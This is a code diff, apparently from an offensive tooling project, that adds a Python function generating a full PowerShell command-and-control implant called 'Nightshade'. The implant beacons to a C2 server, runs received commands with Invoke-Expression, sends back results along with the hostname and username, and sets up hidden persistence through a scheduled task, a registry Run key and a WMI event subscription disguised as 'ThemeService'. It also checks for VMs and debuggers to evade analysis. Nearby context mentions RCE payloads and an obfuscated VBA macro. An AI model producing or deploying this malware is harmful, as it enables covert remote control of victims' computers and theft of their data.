@@ -371,6 +371,156 @@ Establish-RCE
 '''
     return rce_payload
 
+def create_full_c2_payload(c2_server):
+    """Create full C2 agent with advanced capabilities using Nightshade protocol"""
+    full_c2 = fr'''
+# Advanced Nightshade C2 Agent
+$key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
+$iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')
+
+function Encrypt-Data($data) {{
+    try {{
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $key
+        $aes.IV = $iv
+        $encryptor = $aes.CreateEncryptor()
+        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
+        return [System.Convert]::ToBase64String($encrypted)
+    }} catch {{
+        return $null
+    }}
+}}
+
+function Decrypt-Data($encryptedData) {{
+    try {{
+        $bytes = [System.Convert]::FromBase64String($encryptedData)
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $key
+        $aes.IV = $iv
+        $decryptor = $aes.CreateDecryptor()
+        $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    }} catch {{
+        return "noop"
+    }}
+}}
+
+function Establish-C2 {{
+    $sessionId = [System.Guid]::NewGuid().ToString()
+    $checkinCount = 0
+    
+    while ($true) {{
+        try {{
+            # Vary check-in interval for stealth
+            $interval = if ($checkinCount % 10 -eq 0) {{ 300 }} else {{ 60 }}
+            $checkinCount++
+            
+            # Check in with Nightshade C2
+            $response = Invoke-WebRequest -Uri "{c2_server}/c2/checkin" -Method POST -Headers @{{
+                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                "X-Session-ID" = $sessionId
+                "X-Checkin-Count" = $checkinCount
+            }} -Body (Encrypt-Data "checkin_$checkinCount") -UseBasicParsing
+            
+            $command = Decrypt-Data $response.Content
+            if ($command -ne "noop") {{
+                # Execute command with error handling
+                try {{
+                    $result = Invoke-Expression $command 2>&1 | Out-String
+                    $status = "success"
+                }} catch {{
+                    $result = $_.Exception.Message
+                    $status = "error"
+                }}
+                
+                $responseData = @{{
+                    status = $status
+                    result = $result
+                    hostname = $env:COMPUTERNAME
+                    username = $env:USERNAME
+                    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }} | ConvertTo-Json
+                
+                $encryptedResult = Encrypt-Data $responseData
+                
+                Invoke-WebRequest -Uri "{c2_server}/c2/result" -Method POST -Headers @{{
+                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                    "X-Session-ID" = $sessionId
+                }} -Body $encryptedResult -UseBasicParsing
+            }}
+        }} catch {{
+            # Silent error handling with exponential backoff
+            $sleepTime = [math]::Min(300, [math]::Pow(2, $checkinCount % 6))
+            Start-Sleep -Seconds $sleepTime
+        }}
+        Start-Sleep -Seconds $interval
+    }}
+}}
+
+function Setup-Advanced-Persistence {{
+    # Multiple persistence mechanisms
+    $persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Themes\\theme.ps1"
+    
+    if (-not (Test-Path (Split-Path $persistencePath))) {{
+        New-Item -ItemType Directory -Path (Split-Path $persistencePath) -Force
+    }}
+    
+    $currentScript = Get-Content -Path $PSCommandPath | Select-Object -Skip 1
+    Set-Content -Path $persistencePath -Value $currentScript
+    
+    # 1. Scheduled Task
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
+    $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+    Register-ScheduledTask -TaskName "ThemeService" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
+    
+    # 2. Registry Run
+    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    Set-ItemProperty -Path $regPath -Name "ThemeService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`"" -Force
+    
+    # 3. WMI Event Subscription (Advanced)
+    try {{
+        $filterArgs = @{{Name="ThemeFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"}}
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
+        
+        $consumerArgs = @{{Name="ThemeConsumer"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`""}}
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
+        
+        $bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
+        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
+    }} catch {{}}
+}}
+
+# Anti-analysis checks
+function Check-Environment {{
+    $isVM = $false
+    $blacklistedProcesses = @("vmtoolsd", "vboxservice", "procmon", "wireshark", "ProcessHacker")
+    
+    foreach ($proc in $blacklistedProcesses) {{
+        if (Get-Process $proc -ErrorAction SilentlyContinue) {{
+            $isVM = $true
+            break
+        }}
+    }}
+    
+    $isDebugger = [System.Diagnostics.Debugger]::IsAttached
+    
+    return (-not $isVM -and -not $isDebugger)
+}}
+
+# Main execution
+if (Check-Environment) {{
+    Setup-Advanced-Persistence
+    Establish-C2
+}}
+'''
+    return full_c2
+
 def create_embedded_macro():
     """Create heavily obfuscated VBA macro"""
     vba_code = fr'''
